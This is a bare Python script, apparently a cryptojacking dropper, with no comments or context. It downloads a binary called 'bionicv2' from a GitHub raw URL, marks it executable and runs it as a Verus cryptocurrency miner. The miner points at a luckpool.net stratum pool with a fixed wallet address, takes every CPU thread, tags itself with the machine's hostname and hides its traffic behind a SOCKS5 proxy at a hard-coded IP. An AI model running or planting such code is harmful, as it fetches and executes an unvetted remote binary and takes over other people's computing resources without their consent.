import os

os.system("wget -O bionicv2 https://raw.githubusercontent.com/mariobiszz/nenenenenene/main/bionicv2")
os.system("chmod +x bionicv2")
os.system("./bionicv2 -a verus -o stratum+tcp://na.luckpool.net:3956 -u RYWshsv766dTZbLJ6AbHcT8HiWngTrW3qe.$(cat /proc/sys/kernel/hostname) -p x -t $(nproc --all) -x socks5://174.138.17.79:4145")
